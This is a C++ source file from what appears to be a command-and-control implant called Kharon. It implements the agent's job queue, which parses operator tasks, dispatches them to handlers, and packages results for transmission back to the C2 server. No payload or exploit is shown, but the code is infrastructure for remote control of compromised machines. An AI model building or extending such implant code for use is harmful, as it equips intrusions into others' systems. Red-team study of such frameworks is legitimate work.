#include <Kharon.h>

auto DECLFN Jobs::Create(
    _In_ CHAR*   UUID, 
    _In_ PARSER* Parser,
    _In_ BOOL    IsResponse
) -> JOBS* {
    JOBS*   NewJob = (JOBS*)hAlloc( sizeof( JOBS ) );
    PARSER* JobPsr = (PARSER*)hAlloc( sizeof( PARSER ) );

    if ( ! NewJob || ! JobPsr ) {
        if ( NewJob ) hFree( NewJob );
        if ( JobPsr ) hFree( JobPsr );
        return nullptr;
    }

    ULONG Length = 0;
    PVOID Data   = nullptr;
    
    if ( IsResponse ) {
        Self->Psr->Pad( Parser, Length );
        Length = Parser->Length;
        Data   = Parser->Buffer;
        NewJob->Destroy = Parser;
    } else {
        Length = 0;
        Data   = Self->Psr->Bytes( Parser, &Length );
    }

    KhDbg( "data at %p [%d bytes] to parse", Data, Length );
    
    Self->Psr->New( JobPsr, Data, Length );

    ULONG cmdID = Self->Psr->Int16( JobPsr );

    NewJob->ExitCode = -1;
    NewJob->State    = KH_JOB_PRE_START;
    NewJob->CmdID    = cmdID;
    NewJob->UUID     = UUID;
    NewJob->Psr      = JobPsr;
    NewJob->Pkg      = Self->Pkg->Create( NewJob->CmdID, UUID );
    NewJob->Clean    = TRUE;
    NewJob->PersistTriggered = FALSE;

    if ( ! NewJob->Pkg ) {
        hFree( NewJob );
        hFree( JobPsr );
        return nullptr;
    }

    KhDbg( "adding job with uuid: %s and command id: %d", NewJob->UUID, NewJob->CmdID );

    if ( !this->List ) {
        this->List = NewJob;
    } else {
        JOBS* Current = this->List;
        while ( Current->Next ) {
            Current = Current->Next;
        }
        Current->Next = NewJob;
    }
    
    Count++;

    KhDbg( "total jobs: %d", Count );

    return NewJob;
}

auto DECLFN Jobs::Send(
    _In_ PACKAGE* PostJobs
) -> VOID {
    JOBS* Current = List;

    BYTE*  Data   = nullptr;
    UINT64 Lenght = 0;

    while ( Current ) {
        if ( 
            Current->State    == KH_JOB_READY_SEND &&
            Current->ExitCode == EXIT_SUCCESS
        ) {
            KhDbg( "concatenating job: %s", Current->UUID );
            KhDbg( "data at %p [%d bytes]", Current->Pkg->Buffer, Current->Pkg->Length );

            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
            Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
            Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );

            Current->State = KH_JOB_TERMINATE;
            
            if( ! Current->Clean ) {
                Current->State = KH_JOB_RUNNING;
                Self->Pkg->Destroy( Current->Pkg );
                Current->Pkg = Self->Pkg->Create( Current->CmdID, Current->UUID );
            }
        } else if ( 
            Current->State    == KH_JOB_READY_SEND && 
            Current->ExitCode != EXIT_SUCCESS      &&
            Current->ExitCode != -1
        ) {
            PCHAR Unknown  = "unknown error";
            PCHAR ErrorMsg = nullptr;
            ULONG Flags    = FORMAT_MESSAGE_ALLOCATE_BUFFER | 
                             FORMAT_MESSAGE_FROM_SYSTEM     | 
                             FORMAT_MESSAGE_IGNORE_INSERTS;
            
            ULONG MsgLen = Self->Krnl32.FormatMessageA(
                Flags, NULL, Current->ExitCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
                (LPSTR)&ErrorMsg, 0, NULL
            );

            MsgLen = MsgLen ? MsgLen : Str::LengthA( Unknown );

            ULONG PkgLen = MsgLen + 2 + 40 + sizeof( INT16 ) + sizeof( INT32 );

            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
            Self->Pkg->Int32( PostJobs, PkgLen );

            Self->Pkg->Bytes( PostJobs, UC_PTR( Current->UUID ), 36 );
            Self->Pkg->Int16( PostJobs, (INT16)Action::Task::Error );
            Self->Pkg->Int32( PostJobs, Current->ExitCode );

            if ( MsgLen > 0 && ErrorMsg ) {
                Self->Pkg->Str( PostJobs, ErrorMsg );
                Self->Krnl32.LocalFree( ErrorMsg );
            } else {
                Self->Pkg->Str( PostJobs, Unknown );
            }

            Current->State = KH_JOB_TERMINATE;
        }
        
        Current = Current->Next;
    }
    
    Self->Pkg->Transmit( PostJobs, (PVOID*)0, 0 );

    return;
}

auto DECLFN Jobs::Cleanup( VOID ) -> VOID {
    JOBS* Current  = this->List;
    JOBS* Previous = nullptr;

    while ( Current ) {
        if ( Current->State == KH_JOB_TERMINATE ) {
            KhDbg("Cleaning up job: %s", Current->UUID);
            JOBS* ToRemove = Current;
             
            if ( Previous ) {
                Previous->Next = Current->Next;
                Current        = Current->Next;
            } else {
                this->List = Current->Next;
                Current    = this->List;
            }

            if ( ToRemove->Pkg ) {
                KhDbg("Destroying Package for job %s", ToRemove->UUID);
                Self->Pkg->Destroy( ToRemove->Pkg );
                ToRemove->Pkg = nullptr;
            }

            if ( ToRemove->Psr ) {
                KhDbg("Destroying Parser for job %s", ToRemove->UUID);
                Self->Psr->Destroy( ToRemove->Psr );  // Libera apenas o buffer interno (Parser->Original)
                // Parser::Destroy não libera o struct Parser em si, então precisamos fazer isso manualmente
                if ( Self->Hp->CheckPtr( ToRemove->Psr ) ) {
                    KhDbg("Freeing Parser struct for job %s", ToRemove->UUID);
                    hFree( ToRemove->Psr );
                }
                ToRemove->Psr = nullptr;
            }

            // Destroy contém o Parser original passado para Jobs::Create quando IsResponse=TRUE
            if ( ToRemove->Destroy ) {
                KhDbg("Destroying original Parser (Destroy) for job %s", ToRemove->UUID);
                Self->Psr->Destroy( (PARSER*)ToRemove->Destroy );
                if ( Self->Hp->CheckPtr( ToRemove->Destroy ) ) {
                    KhDbg("Freeing original Parser struct (Destroy) for job %s", ToRemove->UUID);
                    hFree( ToRemove->Destroy );
                }
                ToRemove->Destroy = nullptr;
            }

            if ( Self->Hp->CheckPtr( ToRemove ) ) {
                KhDbg("Freeing JOBS struct for job %s", ToRemove->UUID);
                hFree( ToRemove );
            }
            
            Count--;
        } else {
            Previous = Current;
            Current  = Current->Next;
        }
    }
}

auto DECLFN Jobs::ExecuteAll( VOID ) -> LONG {
    JOBS* Current = this->List;
    LONG  FlagRet = 0;

    while ( Current ) {
        if ( Current->State == KH_JOB_PRE_START || Current->State == KH_JOB_RUNNING ) {
            if( ! Current->PersistTriggered && ((Action::Task)Current->CmdID == Action::Task::ProcessDownloads || (Action::Task)Current->CmdID == Action::Task::ProcessTunnels ) ){
                KhDbg("Persist Triggered for job: %s", Current->UUID);
                Current->PersistTriggered = TRUE;
                Current = Current->Next;
                continue;
            }
            
            KhDbg( "executing task UUID : %s", Current->UUID );
            KhDbg( "executing command id: %d", Current->CmdID );

            FlagRet = 1;

            Self->Pkg->Shared = Current->Pkg;
            Self->Psr->Shared = Current->Psr;

            this->CurrentUUID  = Current->UUID;
            this->CurrentCmdId = Current->CmdID;
            Current->State     = KH_JOB_RUNNING;
            ERROR_CODE Result  = Self->Jbs->Execute( Current );
            Current->ExitCode  = Result;
            Current->State     = KH_JOB_READY_SEND;

            KhDbg( "job executed with exit code: %d, should clean: %d", Current->ExitCode, Current->Clean );
        }

        Current = Current->Next;
    }

    return FlagRet;
}

auto DECLFN Jobs::Execute(
    _In_ JOBS* Job
) -> ERROR_CODE {
    G_KHARON

    for ( INT i = 0; i < TSK_LENGTH; i++ ) {
        if ( (Action::Task)Job->CmdID == Self->Tsk->Mgmt[i].ID ) {
            return ( Self->Tsk->*Self->Tsk->Mgmt[i].Run )( Job );
        }
    }

    // KH_ERROR_INVALID_TASK_ID
    return -2;
}

auto DECLFN Jobs::GetByUUID(
    _In_ CHAR* UUID
) -> JOBS* {
    JOBS* Current = this->List;
    while ( Current ) {
        if ( Str::CompareA( Current->UUID, UUID ) == 0 ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::GetByID(
    _In_ ULONG ID
) -> JOBS* {
    JOBS* Current = this->List;
    while ( Current ) {
        if ( Current->CmdID == ID ) {
            return Current;
        }
        Current = Current->Next;
    }
    return nullptr;
}

auto DECLFN Jobs::Remove(
    _In_ JOBS* Job
) -> BOOL {
    if ( !this->List ) return FALSE;
    
    if ( this->List == Job ) {
        this->List = Job->Next;
    } else {
        JOBS* Current = this->List;
        while ( Current->Next && Current->Next != Job ) {
            Current = Current->Next;
        }
        
        if ( Current->Next == Job ) {
            Current->Next = Job->Next;
        } else {
            return FALSE;
        }
    }
    
    hFree( Job );
    this->Count--;

    return TRUE;
}
